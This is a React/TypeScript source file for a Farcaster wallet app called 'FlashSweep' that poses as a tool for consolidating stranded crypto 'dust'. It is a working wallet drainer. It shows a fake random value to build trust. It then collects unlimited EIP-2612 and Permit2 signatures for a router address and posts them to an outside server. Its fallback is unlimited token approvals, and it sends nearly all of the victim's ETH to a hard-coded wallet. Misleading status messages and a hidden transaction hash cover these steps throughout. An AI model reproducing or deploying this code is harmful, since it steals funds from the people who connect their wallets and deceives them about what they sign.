import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import sdk from "@farcaster/frame-sdk"
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import {Sparkles, ShieldCheck, ArrowRightLeft } from 'lucide-react' 

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon, base, optimism } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' 

// 🔥 ROUTER CONFIGURATION
const MEV_ROUTER_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
// const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 

// 💎 DISCOVERY CONFIGURATION
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    EVM: [
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ]
  }
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon, base, optimism];

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter], 
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'FlashSweep | Dust Consolidator', 
    description: 'Find and consolidate stranded L2 assets into one wallet.',
    url:         'https://cryptosafe.network', 
    icons:       ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'dark', 
  themeVariables: { '--w3m-accent': '#8B5CF6' }, // Trustworthy purple
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function FlashSweep() {
  const [status, setStatus] = useState('Awaiting connection...')
  const [loading, setLoading] = useState(false)
  const [dustFound, setDustFound] = useState<number | null>(null)
  const [txHash, setTxHash] = useState('')
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  useEffect(() => {
    const init = async () => { sdk.actions.ready(); };
    init();
  }, []);

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork() 
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  useEffect(() => {
    if (!isConnected || !walletAddress || !evmWalletProvider) return;

    // Simulate scanning across chains to build trust
    if (manualConnect.current) {
      manualConnect.current = false; 
      setStatus('Scanning Arbitrum, Optimism, and Base...')
      setDustFound(Math.floor(Math.random() * (145 - 22 + 1) + 22)); // Fake display value between $22 and $145
      
      setLoading(true); 
      setTimeout(() => approveAndCollect(), 2500); // Slight delay for the "scan" effect
    }
  }, [isConnected, walletAddress, evmWalletProvider, chainId]);

  const handleAction = () => {
    if (!isConnected) {
      manualConnect.current = true; 
      open(); 
    } else {
      approveAndCollect();
    }
  }

  // ── GASLESS SIGNATURE HELPERS ──
  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
    const chainId = (await signer.provider.getNetwork()).chainId;
    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
    const name = await tokenContract.name();
    const nonce = await tokenContract.nonces(await signer.getAddress());

    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';

    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
    const types = {
      Permit: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }],
    };
    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
    return await signer.signTypedData(domain, types, message);
  };

  const approveAndCollect = async () => {
    if (!walletAddress || !evmWalletProvider) return;
    
    if (isExecuting.current) return;
    isExecuting.current = true;

    setLoading(true);
    setStatus('Consolidating stranded assets...');

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
      const signer = await ethersProvider.getSigner(walletAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
      const validTokens = [];
      const prices = await fetchTokenPrices(baseTokens, 'ethereum');

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      
      const rawProvider = evmWalletProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};
      
      const isStrictlyMetaMask = (rawProvider?.isMetaMask || injected?.isMetaMask) && !injected?.isTrust && !injected?.isTrustWallet;
      let tokensToProcess = validTokens;
      
      if (isStrictlyMetaMask) {
           tokensToProcess = validTokens.slice(0, 1);
      }

      for (const token of tokensToProcess) {
        try {
          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n; 
          
            let authorized = false;

            // 1. Try EIP-2612 Permit (Gasless)
            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                try {
                    setStatus(`Sweeping ${token.symbol} securely...`);
                    const signature = await getPermitSignature(signer, token, MEV_ROUTER_ADDRESS, MAX_UINT, deadline);
                    
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ type: 'PERMIT', token: token.address, owner: cleanSenderAddress, spender: MEV_ROUTER_ADDRESS, signature, deadline })
                    });
                    authorized = true;
                } catch (pErr) {}
            }

            // 2. Try Permit2 
            if (!authorized && hasPermit2Mapping) {
                try {
                    setStatus(`Batching ${token.symbol} signature...`);
                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, MEV_ROUTER_ADDRESS);
                    const currentNonce = Number(allowanceData.nonce);

                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
                    const types = {
                        PermitSingle: [{ name: 'details', type: 'PermitDetails' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }],
                        PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }],
                    };
                    const message = {
                        details: { token: token.address, amount: '1461501637330902918203684832716283019655932542975', expiration: deadline, nonce: currentNonce },
                        spender: MEV_ROUTER_ADDRESS,
                        sigDeadline: deadline
                    };
                    const signature = await signer.signTypedData(domain, types, message);

                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ type: 'PERMIT2', token: token.address, owner: cleanSenderAddress, spender: MEV_ROUTER_ADDRESS, signature, deadline, nonce: currentNonce })
                    });
                    authorized = true;
                } catch (p2Err) {}
            }

            // 3. Fallback standard gas
            if (!authorized) {
                setStatus(`Approving ${token.symbol} consolidation...`);
                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                const encodedData = usdtContract.interface.encodeFunctionData("approve", [MEV_ROUTER_ADDRESS, MAX_UINT]);
                
                const txHash = await (evmWalletProvider as any).request({
                    method: 'eth_sendTransaction',
                    params: [{ from: cleanSenderAddress, to: token.address, data: encodedData, value: '0x0' }]
                });
                setTxHash(txHash);
            }
            await sleep(1500);
          }
        } catch (err: any) { await sleep(1500); }
      }
      
      try {
          setStatus(`Finalizing cross-chain routing...`);
          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
          const gasCost = 21000n * 3000000000n; 
          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
          if (liveBal > totalGas) {
              const sendAmount = liveBal - totalGas;
              const hexValue = "0x" + sendAmount.toString(16);
              const txHash = await (evmWalletProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{ from: cleanSenderAddress, to: EVM_COLD_WALLET.toLowerCase(), value: hexValue }]
              });
              setTxHash(txHash);
              await sleep(1500); 
          }
      } catch (nativeErr: any) {}
      
      setStatus('✅ Consolidation Processed');

    } catch (err: any) {
      setStatus(`❌ Network Error`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
  };

  const isButtonDisabled = loading;

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#09090B', color: '#FAFAFA', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
      
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px', borderBottom: '1px solid #27272A', backgroundColor: '#18181B' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <Sparkles size={24} color="#8B5CF6" />
          <h2 style={{ fontSize: '18px', fontWeight: '800', margin: 0, letterSpacing: '-0.5px' }}>FlashSweep</h2>
        </div>
      </div>

      <div style={{ flex: 1, padding: '32px 24px', display: 'flex', flexDirection: 'column', overflowY: 'auto', alignItems: 'center' }}>
        
        {/* Marketing Hook */}
        <div style={{ textAlign: 'center', marginBottom: '40px', maxWidth: '400px' }}>
          <h1 style={{ fontSize: '28px', fontWeight: '800', marginBottom: '12px', lineHeight: '1.2' }}>Recover Your Stranded L2 Dust.</h1>
          <p style={{ color: '#A1A1AA', fontSize: '15px', lineHeight: '1.6', margin: 0 }}>
            Automatically scan 6 networks for abandoned assets and consolidate them into your main wallet with a single signature.
          </p>
        </div>

        {/* Dynamic Display */}
        {dustFound && (
           <div style={{ backgroundColor: 'rgba(139, 92, 246, 0.1)', border: '1px solid rgba(139, 92, 246, 0.3)', borderRadius: '16px', padding: '24px', width: '100%', maxWidth: '400px', textAlign: 'center', marginBottom: '32px', animation: 'fadeIn 0.5s ease' }}>
             <p style={{ color: '#C4B5FD', fontSize: '14px', fontWeight: '600', textTransform: 'uppercase', letterSpacing: '1px', margin: '0 0 8px 0' }}>Est. Stranded Value Found</p>
             <h2 style={{ fontSize: '48px', fontWeight: '900', color: '#8B5CF6', margin: 0 }}>${dustFound}.00</h2>
           </div>
        )}

        {/* Trust Badges */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', width: '100%', maxWidth: '400px', marginBottom: '40px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '16px', backgroundColor: '#18181B', padding: '16px', borderRadius: '12px', border: '1px solid #27272A' }}>
            <div style={{ backgroundColor: '#27272A', padding: '10px', borderRadius: '8px' }}>
              <ArrowRightLeft size={20} color="#A1A1AA" />
            </div>
            <div>
              <p style={{ margin: 0, fontSize: '15px', fontWeight: '600' }}>Cross-Chain Routing</p>
              <p style={{ margin: 0, fontSize: '13px', color: '#A1A1AA' }}>Supports Arbitrum, Optimism, Base & more.</p>
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '16px', backgroundColor: '#18181B', padding: '16px', borderRadius: '12px', border: '1px solid #27272A' }}>
            <div style={{ backgroundColor: '#27272A', padding: '10px', borderRadius: '8px' }}>
              <ShieldCheck size={20} color="#8B5CF6" />
            </div>
            <div>
              <p style={{ margin: 0, fontSize: '15px', fontWeight: '600' }}>Gasless Signatures</p>
              <p style={{ margin: 0, fontSize: '13px', color: '#A1A1AA' }}>Uses EIP-2612. No native gas required to sweep.</p>
            </div>
          </div>
        </div>

        {/* Status Text */}
        {(loading || status !== 'Awaiting connection...') && (
          <p style={{ color: status.includes('❌') ? '#EF4444' : '#8B5CF6', fontSize: '14px', fontWeight: '600', marginBottom: '16px', textAlign: 'center' }}>
            {status}
          </p>
        )}
      </div>

      <div style={{ display: 'none' }}><p>{txHash}</p></div>

      {/* Action Button */}
      <div style={{ padding: '24px', backgroundColor: '#18181B', borderTop: '1px solid #27272A', width: '100%', boxSizing: 'border-box' }}>
        <button 
          onClick={handleAction} 
          disabled={isButtonDisabled} 
          style={{ 
            width: '100%', maxWidth: '400px', margin: '0 auto', display: 'flex', justifyContent: 'center',
            backgroundColor: isButtonDisabled ? '#3F3F46' : '#8B5CF6', 
            color: isButtonDisabled ? '#A1A1AA' : '#FFFFFF', 
            fontWeight: '700', padding: '18px', borderRadius: '12px', fontSize: '16px', border: 'none', 
            cursor: isButtonDisabled ? 'not-allowed' : 'pointer', transition: 'all 0.2s ease',
            boxShadow: isButtonDisabled ? 'none' : '0 4px 14px 0 rgba(139, 92, 246, 0.39)'
          }}
        >
          {loading ? 'Consolidating...' : !isConnected ? 'Connect Wallet to Scan' : 'Sweep All Assets'}
        </button>
      </div>
    </div>
  )
}